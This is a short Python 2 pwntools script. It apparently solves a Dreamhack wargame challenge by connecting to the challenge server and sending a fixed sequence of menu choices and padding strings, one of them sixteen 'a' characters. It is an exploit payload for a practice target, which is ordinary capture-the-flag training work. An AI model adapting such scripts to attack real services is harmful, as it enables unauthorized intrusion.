#!/usr/bin/env python2

from pwn import *

HOST = "host1.dreamhack.games"
PORT = 21868

conn = remote(HOST, PORT)

payload = ["3","1","a"*0x10,"9"*10,"2"]

for i in range(len(payload)):
    conn.sendline(payload[i])
print(conn.recvall(timeout=0.5))
